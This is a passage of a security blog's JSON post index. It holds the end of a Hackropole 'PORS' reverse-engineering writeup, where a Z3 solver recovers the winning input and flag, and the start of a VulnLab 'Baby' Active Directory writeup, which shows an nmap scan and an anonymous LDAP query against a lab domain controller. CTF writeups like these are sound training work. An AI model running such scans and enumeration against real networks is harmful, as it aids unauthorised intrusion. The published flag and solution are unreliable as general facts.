style=\"color:#ae81ff\"\u003e14\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e16\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e17\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e17\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e17\u003c/span\u003e],\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egrid \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e [[BitVec(\u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;x\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003ei\u003cspan style=\"color:#e6db74\"\u003e}{\u003c/span\u003ej\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e8\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e j \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e range(\u003cspan style=\"color:#ae81ff\"\u003e9\u003c/span\u003e)] \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e i \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e range(\u003cspan style=\"color:#ae81ff\"\u003e9\u003c/span\u003e)]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003es \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e Solver()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e i \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e range(\u003cspan style=\"color:#ae81ff\"\u003e9\u003c/span\u003e):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e j \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e range(\u003cspan style=\"color:#ae81ff\"\u003e9\u003c/span\u003e):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e# values between 1 and 9\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        s\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eadd(And(grid[i][j] \u003cspan style=\"color:#f92672\"\u003e\u0026gt;=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e, grid[i][j] \u003cspan style=\"color:#f92672\"\u003e\u0026lt;=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e9\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e# apply pre-filled values\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e constraints[i][j] \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            s\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eadd(grid[i][j] \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e constraints[i][j])\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e# no repetition with neighbors (Suguru)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e i \u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e8\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            s\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eadd(grid[i][j] \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e grid[i\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e][j])\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e j \u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e8\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                s\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eadd(grid[i][j] \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e grid[i\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e][j\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e])\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e j \u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                s\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eadd(grid[i][j] \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e grid[i\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e][j\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e])\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e i \u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            s\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eadd(grid[i][j] \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e grid[i\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e][j])\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e j \u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e8\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                s\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eadd(grid[i][j] \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e grid[i\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e][j\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e])\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e j \u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                s\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eadd(grid[i][j] \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e grid[i\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e][j\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e])\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e j \u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e8\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            s\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eadd(grid[i][j] \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e grid[i][j\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e])\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e j \u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            s\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eadd(grid[i][j] \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e grid[i][j\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e])\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ec_areas \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e [\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e]\u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x13\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003es_areas \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e [\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e]\u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x13\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e i \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e range(\u003cspan style=\"color:#ae81ff\"\u003e9\u003c/span\u003e):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e j \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e range(\u003cspan style=\"color:#ae81ff\"\u003e9\u003c/span\u003e):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        c_areas[areas[i][j]] \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        s_areas[areas[i][j]] \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e (\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e (grid[i][j] \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e i \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e range(\u003cspan style=\"color:#ae81ff\"\u003e0x13\u003c/span\u003e):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    s\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eadd(s_areas[i] \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e (\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e c_areas[i]) \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e s\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003echeck() \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e sat:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    m \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e s\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003emodel()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    sol_mat \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e [[m[grid[i][j]]\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eas_long() \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e j \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e range(\u003cspan style=\"color:#ae81ff\"\u003e9\u003c/span\u003e)] \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e i \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e range(\u003cspan style=\"color:#ae81ff\"\u003e9\u003c/span\u003e)]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    sol \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ejoin(str(m[grid[i][j]]\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eas_long()) \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e i \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e range(\u003cspan style=\"color:#ae81ff\"\u003e9\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e j \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e range(\u003cspan style=\"color:#ae81ff\"\u003e9\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Solution:\u0026#34;\u003c/span\u003e, sol)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;[-] Unable to solve the puzzle\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eRunning the solver, we find that the correct input is: \u003ccode\u003e141253514235414232142323541235141232142323541231514132142323251351541434143232521\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eLet\u0026rsquo;s verify:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003el0key at dev in \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e~/Documents/hackropole/pors\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e20:56:17  ./pors\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eEnter your input: \u003cspan style=\"color:#ae81ff\"\u003e141253514235414232142323541235141232142323541231514132142323251351541434143232521\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e+\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Congratulations! You can validate the challenge with this flag: CWTE\u003cspan style=\"color:#f92672\"\u003e{\u003c/span\u003epr0gr4mm4t10n_0r13nt33_r3t0ur_s1gn4l\u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eThanks to spikeroot for this awesome challenge!\u003c/p\u003e\n\u003cp\u003eReferences:\n\u003ca href=\"https://man7.org/linux/man-pages/man7/signal.7.html\"\u003ehttps://man7.org/linux/man-pages/man7/signal.7.html\u003c/a\u003e\n\u003ca href=\"https://sthbrx.github.io/blog/2016/05/13/srop-mitigation/\"\u003ehttps://sthbrx.github.io/blog/2016/05/13/srop-mitigation/\u003c/a\u003e\n\u003ca href=\"https://www.cs.vu.nl/~herbertb/papers/srop_sp14.pdf\"\u003ehttps://www.cs.vu.nl/~herbertb/papers/srop_sp14.pdf\u003c/a\u003e\u003c/p\u003e\n","date":"2025-10-12","dateFormatted":"2025.10.12","excerpt":"\u003cp\u003eThis writeup is for the PORS challenge from Hackropole, a 2-star difficulty challenge.\u003c/p\u003e\n\u003ch2 id=\"reconnaissance\"\u003eReconnaissance\u003c/h2\u003e\n\u003cp\u003eThe binary is in ELF format, x86_64 architecture and is stripped:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003el0key at dev in \u003cspan style=\"color:#f92672\"\u003e[ \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","featured":null,"mood":null,"permalink":"http://localhost:1313/posts/pors/hackropole_pors/","readingTime":11,"slug":"hackropole_pors","subtitle":null,"summary":"\u003cp\u003eThis writeup is for the PORS challenge from Hackropole, a 2-star difficulty challenge.\u003c/p\u003e\n\u003ch2 id=\"reconnaissance\"\u003eReconnaissance\u003c/h2\u003e\n\u003cp\u003eThe binary is in ELF format, x86_64 architecture and is stripped:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003el0key at dev in \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e~/Documents/hackropole/pors\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e19:39:09  file pors\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003epors: ELF 64-bit LSB executable, x86-64, version \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eSYSV\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003esha1\u003cspan style=\"color:#f92672\"\u003e]=\u003c/span\u003ee03394fc3f442e87fd6114acbff6082426e4a652, \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e GNU/Linux 3.2.0, stripped\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eA first execution shows that it asks for input:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003el0key at dev in \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e~/Documents/hackropole/pors\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e19:39:12  ./pors\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eEnter your input: test\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e-\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Wrong input, sorry...\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eThere\u0026rsquo;s also a file containing raw data alongside the executable (program.bin).\u003c/p\u003e","tags":["reverse"],"title":"Hackropole : PORS","url":"http://localhost:1313/posts/pors/hackropole_pors/","wordCount":2179},{"content":"\u003cp\u003eThis is a writeup for the VulnLab Baby easy machine. We\u0026rsquo;ll be dealing with a Windows environment where we\u0026rsquo;ll need to use LDAP enumeration and the password spraying technique.\u003c/p\u003e\n\u003ch2 id=\"reconnaissance\"\u003eReconnaissance\u003c/h2\u003e\n\u003cp\u003eA first scan with nmap shows us the following ports:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eOct 12, \u003cspan style=\"color:#ae81ff\"\u003e2025\u003c/span\u003e - 21:17:10 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eCEST\u003cspan style=\"color:#f92672\"\u003e)]\u003c/span\u003e exegol-vulnlab /workspace \u003cspan style=\"color:#75715e\"\u003e# nmap -sSV --top-ports=1000 10.10.117.161\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eStarting Nmap 7.93 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003e https://nmap.org \u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e at 2025-10-12 21:17 CEST\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eNmap scan report \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e 10.10.117.161\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eHost is up \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003e0.027s latency\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e.\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eNot shown: \u003cspan style=\"color:#ae81ff\"\u003e987\u003c/span\u003e filtered tcp ports \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eno-response\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ePORT     STATE SERVICE       VERSION\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e53/tcp   open  domain        Simple DNS Plus\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e88/tcp   open  kerberos-sec  Microsoft Windows Kerberos \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eserver time: 2025-10-12 19:17:45Z\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e135/tcp  open  msrpc         Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e389/tcp  open  ldap          Microsoft Windows Active Directory LDAP \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eDomain: baby.vl0., Site: Default-First-Site-Name\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e445/tcp  open  microsoft-ds?\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e464/tcp  open  kpasswd5?\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e636/tcp  open  tcpwrapped\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e3268/tcp open  ldap          Microsoft Windows Active Directory LDAP \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eDomain: baby.vl0., Site: Default-First-Site-Name\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e3269/tcp open  tcpwrapped\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e3389/tcp open  ms-wbt-server Microsoft Terminal Services\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eSSDP/UPnP\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eService Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eWe\u0026rsquo;re dealing with an Active Directory environment.\u003c/p\u003e\n\u003cp\u003eWe\u0026rsquo;ll start by checking if anonymous bind to LDAP is possible, using the ldapsearch command:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eOct 12, \u003cspan style=\"color:#ae81ff\"\u003e2025\u003c/span\u003e - 21:22:36 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eCEST\u003cspan style=\"color:#f92672\"\u003e)]\u003c/span\u003e exegol-vulnlab /workspace \u003cspan style=\"color:#75715e\"\u003e# ldapsearch -x -H ldap://baby.vl:3268 -b 